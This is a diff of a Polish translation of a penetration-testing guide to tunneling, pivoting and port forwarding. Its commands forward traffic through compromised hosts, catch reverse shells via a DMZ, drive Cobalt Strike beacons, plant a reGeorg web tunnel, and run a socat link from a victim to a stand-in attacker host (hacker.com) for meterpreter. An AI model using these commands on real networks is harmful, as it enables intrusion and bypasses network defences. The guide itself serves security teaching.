@@ -1,11 +1,11 @@
-# Tunneling i Przekierowywanie Portów
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Wskazówka Nmap
+## Nmap tip
 
 > [!WARNING]
-> **Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
+> **Skanowanie ICMP** i **SYN** nie mogą być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
 
 ## **Bash**
 
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Lokalny port --> Skompromitowany host (SSH) --> Trzecia_pudełko:Port
+Lokalny port --> Skompromitowany host (SSH) --> Trzecia_puszka:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Reverse Port Forwarding
 
-To jest przydatne do uzyskiwania reverse shelli z wewnętrznych hostów przez DMZ do twojego hosta:
+To jest przydatne do uzyskiwania odwrotnych powłok z wewnętrznych hostów przez DMZ do twojego hosta:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,8 +89,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Możesz **tunele** przez **ssh** cały **ruch** do **podsieci** przez hosta.\
-Na przykład, przekierowując cały ruch idący do 10.10.10.0/24
+Możesz **tunnel** przez **ssh** cały **traffic** do **subnetwork** przez hosta.\
+Na przykład, przekierowując cały traffic kierujący się do 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być używany do **przekierowywania ruchu przez beacon**.
+Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być użyty do **przekierowywania ruchu przez beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -145,18 +145,18 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego hosta:port
+> W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze Team Server, a ruch jest wysyłany do serwera Team Server, a stamtąd do wskazanego host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Do zauważenia:
+Aby zauważyć:
 
 - Odwrócone przekierowanie portów Beacona jest zaprojektowane do **tunnelingu ruchu do Serwera Zespołu, a nie do przekazywania między poszczególnymi maszynami**.
 - Ruch jest **tunnelowany w ramach ruchu C2 Beacona**, w tym linków P2P.
 - **Uprawnienia administratora nie są wymagane** do tworzenia odwróconych przekierowań portów na wysokich portach.
 
-### rPort2Port lokalny
+### rPort2Port lokalnie
 
 > [!WARNING]
 > W tym przypadku **port jest otwierany na hoście beacona**, a nie na Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
@@ -168,7 +168,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Musisz przesłać plik webowy tunel: ashx|aspx|js|jsp|php|php|jsp
+Musisz przesłać plik tunelowy: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -186,7 +186,7 @@ Musisz używać **tej samej wersji dla klienta i serwera**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Przekierowanie portów
+### Przekierowywanie portów
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -286,13 +286,15 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Możesz obejść **proxy bez uwierzytelnienia**, wykonując tę linię zamiast ostatniej w konsoli ofiary:
+Możesz obejść **nieautoryzowany proxy**, wykonując tę linię zamiast ostatniej w konsoli ofiary:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-### SSL Socat Tunnel
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-**/bin/sh console**
+### Tunel SSL Socat
+
+**/bin/sh konsola**
 
 Utwórz certyfikaty po obu stronach: Klient i Serwer
 ```bash
@@ -318,9 +320,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-To jak wersja konsolowa PuTTY (opcje są bardzo podobne do klienta ssh).
+To jak konsolowa wersja PuTTY (opcje są bardzo podobne do klienta ssh).
 
-Ponieważ ten plik binarny będzie wykonywany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
+Ponieważ ten plik binarny będzie uruchamiany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -344,7 +346,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Musisz mieć **dostęp RDP do systemu**.\
 Pobierz:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji Zdalnego Pulpitu w systemie Windows. DVC odpowiada za **tunneling pakietów przez połączenie RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji Zdalnego Pulpitu w systemie Windows. DVC jest odpowiedzialne za **tunneling pakietów przez połączenie RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
@@ -352,9 +354,9 @@ Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten spos�
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Teraz możemy **połączyć** się z **ofiarą** przez **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **plugin SocksOverRDP jest włączony**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
+Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **wtyczka SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
 
-**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary binarkę `SocksOverRDP-Server.exe`:
+**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -362,13 +364,13 @@ Teraz potwierdź na swoim urządzeniu (atakującym), że port 1080 nasłuchuje:
 ```
 netstat -antb | findstr 1080
 ```
-Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxy'owania ruchu przez ten port.**
+Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxyfikacji ruchu przez ten port.**
 
-## Proxify aplikacje GUI Windows
+## Proxyfikacja aplikacji GUI w Windows
 
-Możesz sprawić, że aplikacje GUI Windows będą korzystać z proxy, używając [**Proxifier**](https://www.proxifier.com/).\
+Możesz sprawić, że aplikacje GUI w Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
 W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
-W **Profile -> Proxification Rules** dodaj nazwę programu do proxy'owania oraz połączenia do IP, które chcesz proxy'ować.
+W **Profile -> Proxification Rules** dodaj nazwę programu do proxyfikacji oraz połączenia do IP, które chcesz proxyfikować.
 
 ## Ominięcie proxy NTLM
 
@@ -381,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Uwierzytelnia się w stosunku do proxy i wiąże lokalny port, który jest przekazywany do zewnętrznej usługi, którą określisz. Następnie możesz używać wybranego narzędzia przez ten port.\
+Uwierzytelnia się w stosunku do proxy i wiąże lokalny port, który jest przekazywany do zewnętrznej usługi, którą określisz. Następnie możesz używać narzędzia według własnego wyboru przez ten port.\
 Na przykład, aby przekazać port 443
 ```
 Username Alice
@@ -390,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Teraz, jeśli ustawisz na przykład w ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
+Teraz, jeśli na przykład ustawisz na ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
 Możesz również użyć **meterpreter**, który łączy się z localhost:443, a atakujący nasłuchuje na porcie 2222.
 
 ## YARP
@@ -478,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **to narzędzie do eksponowania rozwiązań w Internecie w jednej linii poleceń.**\
-&#xNAN;_&#x45;xposition URI są jak:_ **UID.ngrok.io**
+_&#x45;xposition URI są jak:_ **UID.ngrok.io**
 
 ### Instalacja
 
